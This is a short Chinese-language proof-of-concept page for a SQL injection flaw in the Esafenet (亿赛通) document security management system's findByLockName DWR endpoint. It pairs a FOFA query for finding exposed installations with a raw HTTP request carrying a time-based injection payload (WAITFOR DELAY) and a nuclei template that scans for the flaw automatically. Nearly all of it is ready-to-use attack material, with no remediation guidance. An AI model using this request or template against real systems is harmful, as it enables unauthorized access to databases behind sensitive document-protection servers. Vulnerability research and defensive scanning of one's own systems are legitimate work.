## 亿赛通电子文档安全管理系统-jlockseniordao-findbylockname-sql注入漏洞

## fofa
```
app="亿赛通-电子文档安全管理系统"
```

## poc
```
POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 414
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: text/plain
Accept-Encoding: gzip

callCount=1
page=/CDGServer3/dwr/test/JLockDao
httpSessionId=
scriptSessionId=
c0-scriptName=JLockSeniorDao
c0-methodName=findByLockName
c0-id=0
c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:3'--
batchId=0
```

## nuclei
```
id: msk-template

info:
  name: msk-template
  author: msk
  severity: high



http:
  - raw:
      - |
        POST /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
        Content-Length: 414
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: text/plain
        Accept-Encoding: gzip

        callCount=1
        page=/CDGServer3/dwr/test/JLockDao
        httpSessionId=
        scriptSessionId=
        c0-scriptName=JLockSeniorDao
        c0-methodName=findByLockName
        c0-id=0
        c0-param0=string:defaultKey1';WAITFOR DELAY '0:0:3'--
        batchId=0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"allowScriptTagRemoting") && duration > 3
```
